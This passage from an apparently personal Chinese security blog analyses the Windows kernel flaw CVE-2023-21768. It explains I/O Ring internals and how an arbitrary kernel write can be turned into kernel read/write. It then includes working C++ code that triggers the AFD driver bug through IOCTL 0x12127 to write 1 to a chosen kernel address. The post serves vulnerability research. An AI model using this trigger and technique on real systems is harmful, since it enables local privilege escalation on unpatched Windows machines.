<p>IORING_OP_WRITE:请求将输出缓冲区的数据写入到文件,通过kernelbase!BuildIoRingWriteFile调用</p>
<p>IORING_OP_FLUSH:请求刷新文件,通过kernelbase!BuildIoRingFlushFile调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _NT_IORING_SQE</span><br><span class="line">&#123;</span><br><span class="line">    enum IORING_OP_CODE OpCode;</span><br><span class="line">    enum NT_IORING_SQE_FLAGS Flags;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">        ULONG64 UserData;</span><br><span class="line">        ULONG64 PaddingUserDataForWow;</span><br><span class="line">    &#125;;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">        NT_IORING_OP_READ Read;</span><br><span class="line">        NT_IORING_OP_REGISTER_FILES RegisterFiles;</span><br><span class="line">        NT_IORING_OP_REGISTER_BUFFERS RegisterBuffers;</span><br><span class="line">        NT_IORING_OP_CANCEL Cancel;</span><br><span class="line">        NT_IORING_OP_WRITE Write;</span><br><span class="line">        NT_IORING_OP_FLUSH Flush;</span><br><span class="line">        NT_IORING_OP_RESERVED ReservedMaxSizePadding;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; NT_IORING_SQE, *PNT_IORING_SQE;</span><br></pre></td></tr></table></figure>

<p>下面是一个读取操作</p>
<p>当Flags为3时,FileRef是文件句柄的索引,这是在ring3提前打开的一些文件句柄,在io ring注册之后,以数组的方式存储.</p>
<p>同样的buffer也是索引,缓冲区也可以提前创建好并预注册的,最后按照索引将文件数据读取buffer-&gt;length长度,写入到buffer-&gt;address预注册缓冲区中.</p>
<p>通过这样的结构,形成了一个读取队列.</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729135429134.png" alt="image-20230729135429134"></p>
<p>一个环形队列结构</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729135508192.png" alt="image-20230729135508192"></p>
<p>上面是一个IORING_OP_READ的过程.将文件数据读取到了预注册的缓冲区.</p>
<p>也可以通过IORING_OP_WRITE将预注册缓冲区的数据写入到文件中.</p>
<p>如果存在任意地址的写入漏洞,可以覆盖内核对象中ioring-&gt;RegBuffer的指针,让其指向的内存可控,在内核处理时,并不会检测验证,它会认为这是一个预注册的缓冲区.所以可以利用漏洞伪造一个缓冲区数组,控制buffer-&gt;address和buff-&gt;length,然后调用BuildIoRingReadFile&#x2F;BuildIoRingWriteFile函数.实现任意地址的读写.</p>
<p>但是针对这个漏洞,由于KeRemoveQueueEx的返回值总是1,所以我们只能对任意内核地址写入1.没有办法写入任意数据.</p>
<p>目前io ring的读写都是基于文件的,在文章中,提到了使用管道的方式,更加隐蔽.</p>
<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><p><strong>1.首先,要编写代码绕过之前分析的一些条件,让其可以正常执行到漏洞点.</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE ntBase = <span class="built_in">GetModuleHandleW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	_NtCreateFile = (FUN_NtCreateFile)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtCreateFile&quot;</span>);</span><br><span class="line">	_NtDeviceIoControlFile = (FUN_NtDeviceIoControlFile)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtDeviceIoControlFile&quot;</span>);</span><br><span class="line">	_NtCreateIoCompletion = (FUN_NtCreateIoCompletion)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtCreateIoCompletion&quot;</span>);</span><br><span class="line">	_NtSetIoCompletion = (FUN_NtSetIoCompletion)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtSetIoCompletion&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	UNICODE_STRING objFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	OBJECT_ATTRIBUTES objectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IO_STATUS_BLOCK ioStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSocket = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hCompletion = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hEvent = <span class="literal">NULL</span>;</span><br><span class="line">	AFD_NOTIFYSOCK_INPUT data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	objFilePath.Buffer = (PWSTR)<span class="string">L&quot;\\Device\\Afd\\Endpoin&quot;</span>;</span><br><span class="line">	objFilePath.Length = <span class="built_in">wcslen</span>(objFilePath.Buffer) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">	objFilePath.MaximumLength = objFilePath.Length;</span><br><span class="line">	objectAttributes.Length = <span class="built_in">sizeof</span>(OBJECT_ATTRIBUTES);</span><br><span class="line">	objectAttributes.ObjectName = &amp;objFilePath;</span><br><span class="line">	objectAttributes.Attributes = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">	BYTE bExtendedAttributes[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x4F</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x50</span>,</span><br><span class="line">		<span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0xEF</span>, <span class="number">0x3D</span>, <span class="number">0x47</span>, <span class="number">0xFE</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	status = _NtCreateFile(&amp;hSocket, MAXIMUM_ALLOWED, &amp;objectAttributes, &amp;ioStatusBlock, <span class="literal">NULL</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="number">1</span>, <span class="number">0</span>, bExtendedAttributes, <span class="built_in">sizeof</span>(bExtendedAttributes));</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]NtCreateFile fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	status = _NtCreateIoCompletion(&amp;hCompletion, MAXIMUM_ALLOWED, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]NtCreateIoCompletion fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	status = _NtSetIoCompletion(hCompletion, <span class="number">0x1337</span>, &amp;ioStatusBlock, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]NtSetIoCompletion fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	data.hCompletion = hCompletion;</span><br><span class="line">	data.pData1 = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x2000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	data.pData2 = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x2000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	data.pData3 = (PVOID)<span class="number">0x1</span>;</span><br><span class="line">	data.dw1 = <span class="number">0x1</span>;</span><br><span class="line">	data.dw2 = <span class="number">100000000</span>;</span><br><span class="line">	data.dw3 = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	hEvent = <span class="built_in">CreateEvent</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hEvent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]CreateEvent fail:%x\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	status=_NtDeviceIoControlFile(hSocket, hEvent, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;ioStatusBlock, <span class="number">0x12127</span>, &amp;data, <span class="built_in">sizeof</span>(AFD_NOTIFYSOCK_INPUT), <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]NtDeviceIoControlFile fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]call AfdNotifyRemoveIoCompletion success&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IoRemoveIoCompletion执行成功</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230730011214690.png" alt="image-20230730011214690"></p>
<p>然后成功执行到漏洞点,将返回值赋值给我们结构体中AFD_NOTIFYSOCK_INPUT-&gt;pData3,因为这里pData3给的地址是无效的,所以返回了c0000005.</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230730011540465.png" alt="image-20230730011540465"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/" rel="prev" title="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL">
      <i class="fa fa-chevron-left"></i> hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">CVE-2023-21768漏洞分析与利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-i-x2F-o-Ring-%E6%8A%80%E6%9C%AF%E4%B8%8E"><span class="nav-number">1.2.</span> <span class="nav-text">2.i&#x2F;o Ring 技术与</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">3.漏洞利用</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Ash</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ash</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
